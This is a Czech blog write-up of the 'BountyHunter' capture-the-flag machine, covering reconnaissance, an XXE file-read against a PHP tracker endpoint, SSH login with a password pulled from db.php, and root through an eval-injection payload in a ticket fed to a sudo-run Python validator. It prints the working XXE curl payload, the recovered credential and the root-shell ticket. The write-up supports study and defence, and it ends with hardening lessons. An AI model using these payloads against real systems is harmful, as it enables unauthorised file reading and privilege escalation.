---
layout: post
author: Tomáš Matějíček
title: "BountyHunter"
date: 2020-11-11
tags: linux rce ssh sudo php exploit
---
## Úvod a kontext

BountyHunter je přímočarý, ale velmi instruktivní řetězec. Nenápadný tracker formulář zpracovává XML a přes `tracker_diRbPr00f314.php` se z něj stane XXE, které dovolí číst lokální soubory. Přes `/etc/passwd` se dá potvrdit účet `development` a přes `db.php` vytáhnout heslo správce databáze.

Hodnota článku ale neleží jen v prvním footholdu. Root část ukazuje úplně jinou třídu chyby: `sudo` pravidlo pro `ticketValidator.py`, které používá `eval` nad obsahem markdown ticketu. To je dobrý příklad, jak se z interní utility stane přímý privesc vektor.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```
```
PORT   STATE SERVICE VERSION
```

### Detailní analýza služeb

V dalším kroku si zpřesňuji verze služeb a jejich charakteristiky, protože právě z těchto detailů obvykle vzniká rozhodnutí, zda pokračovat přes web, SSH nebo jinou vrstvu.
```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
```
```
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: __CENSORED__
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumerace webu

Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
```bash
./dirsearch/dirsearch.py -u http://$IP -e php -x 403 -r
```
```
[17:55:44] Starting:
[17:56:00] 301 -  313B  - /assets  ->  http://10.10.11.100/assets/     (Added to queue)
[17:56:03] 301 -  310B  - /css  ->  http://10.10.11.100/css/     (Added to queue)
=> [17:56:03] 200 -    0B  - /db.php
[17:56:07] 200 -   25KB - /index.php
[17:56:07] 200 -   25KB - /index.php/login/     (Added to queue)
[17:56:08] 301 -  309B  - /js  ->  http://10.10.11.100/js/     (Added to queue)
[17:56:14] 301 -  316B  - /resources  ->  http://10.10.11.100/resources/     (Added to queue)
[17:56:14] 200 -    3KB - /resources/
```

## Získání přístupu

### XXE v trackeru

`README.txt` sice mluví jen o tracker skriptu a test účtu, ale skutečný problém je v parseru XML. `tracker_diRbPr00f314.php` načítá externí entity a bez další ochrany vrací obsah lokálních souborů.
```text
http://10.10.11.100/resources/README.txt
```
```
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```

### Čtení zdrojáku a `db.php`

Po potvrzení XXE dává smysl číst nejdřív zdroják trackeru a potom `db.php`. Právě tam leží heslo `m19RoAU0hP41A1sTsq6K`, které se ukáže jako použitelné i pro účet `development`.
```bash
curl -v 'http://10.10.11.100/tracker_diRbPr00f314.php' --data-urlencode "data=$(echo '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE bugreport [<!ENTITY harmless SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/tracker_diRbPr00f314.php">]><bugreport><title>aa</title><cwe>aa</cwe><cvss>aa</cvss><reward>&harmless;</reward></bugreport>' | base64 -w 0)"
```
```
<?php

if(isset($_POST['data'])) {
$xml = base64_decode($_POST['data']);
libxml_disable_entity_loader(false);
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
$bugreport = simplexml_import_dom($dom);
}
?>
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td><?php echo $bugreport->title; ?></td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td><?php echo $bugreport->cwe; ?></td>
  </tr>
  <tr>
    <td>Score:</td>
    <td><?php echo $bugreport->cvss; ?></td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td><?php echo $bugreport->reward; ?></td>
  </tr>
</table>
```

### Přihlášení na cíl

Jakmile už XXE vrátí heslo z `db.php`, je rozumné přejít na SSH. Webový vektor tím splnil účel a stabilní shell pod `development` usnadní čtení `sudo` pravidel i analýzu interních skriptů.
```bash
ssh development@10.10.11.100
```

### Získání user flagu

SSH pod `development` je už stabilní foothold. `user.txt` proto slouží hlavně jako ověření, že reuse hesla z `db.php` opravdu vedl k interaktivnímu přístupu do hostu.

```text
ssh development@10.10.11.100
cat user.txt
__CENSORED__
sudo -l
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

Zásadní byla i implementace validátoru:
```python
validationNumber = eval(x.replace("**", ""))
```

```bash
cp /opt/skytrain_inc/invalid_tickets/390681613.md /tmp/shell.md
```

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```text
Skytrain Inc
```

Do ticketu pak stačilo vložit payload zneužívající `eval`:
```text
Ticket to New Haven
__Ticket Code:__
**102+ 10 == 112 and __import__('os').system('/bin/bash') == False
##Issued: 2021/04/06
#End Ticket
```

```bash
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py /tmp/shell.md
cat /root/root.txt
```

## Shrnutí klíčových poznatků

- Klíčový vstup neležel v celé aplikaci, ale v jediném XML endpointu `tracker_diRbPr00f314.php`, který umožnil XXE a čtení lokálních souborů.
- User přístup vznikl z hesla vytaženého z `db.php`, které bylo znovu použité pro SSH účet `development`.
- Root nevznikl z další webové chyby, ale z interní utility `ticketValidator.py`, kde `eval` nad ticketem běžel přes `sudo` jako root.

## Co si odnést do praxe

- XML parsery a knihovny pro import dokumentů musí mít zakázané externí entity. Jakmile lze přes XXE číst lokální soubory, útočník si velmi rychle vytáhne hesla a zdrojáky.
- Tajemství uložená v pomocných souborech typu `db.php` nesmějí být reuseovaná pro shellové účty. Tady přesně tohle změnilo čtení souboru v plnohodnotný SSH přístup.
- `sudo` wrappery nad interpretry je potřeba číst stejně přísně jako vlastní kód. `eval` v `ticketValidator.py` ukazuje, že i interní validační utilita může bez problémů skončit root shellem.
